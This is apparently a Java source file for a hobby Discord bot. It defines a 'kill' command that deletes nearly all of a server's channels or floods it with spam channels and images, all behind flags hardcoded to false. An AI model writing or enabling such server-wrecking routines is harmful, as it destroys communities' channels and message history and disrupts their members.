package narwhals64.YeastBot.Commands;

import narwhals64.YeastBot.YeastBot;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.utils.AttachmentOption;

import java.io.File;


public class Kill extends ListenerAdapter {
    public void onGuildMessageReceived(GuildMessageReceivedEvent event) {
        String args[] = event.getMessage().getContentRaw().split("\\s+");

        boolean allowKill = false;

        boolean allowDel = false;
        boolean allowPog = false;
        boolean allowSip = false;


        if (allowKill && YeastBot.getProfile(event.getAuthor().getId()).getAdministration() == 99) {

            if (args[0].equalsIgnoreCase(YeastBot.getPrefix(event) + "kill")) {
                Guild guild = event.getGuild();

                if (allowDel && args[1].equalsIgnoreCase("del")) {
                    for (int i = 0 ; i < guild.getChannels().size() - 1 ; i++)
                        guild.getChannels().get(i).delete().queue();
                }

                else if (allowPog && args[1].equalsIgnoreCase("pog")) {
                    for (int i = 0; i < 20; i++)
                        guild.createTextChannel("poggers").queue();

                }

                else if (allowSip && args[1].equalsIgnoreCase("sip")) {
                    for (int i = 0 ; i < 20 ; i++) {
                        guild.createTextChannel("sip").queue();
                    }
                    try {
                        Thread.sleep(6000);
                    } catch (Exception e) {}
                    sendSip(guild);
                }

            }

        }

    }

    private void sendSip(Guild guild) {
        File sip = new File("C:\\Users\\Ethan Rao\\Desktop\\Yeast Bot\\sip.jpg");
        for (int i = 0 ; i < 20 ; i++) {
            guild.getTextChannelsByName("sip", false).get(i).sendFile(sip).queue();
        }
    }

}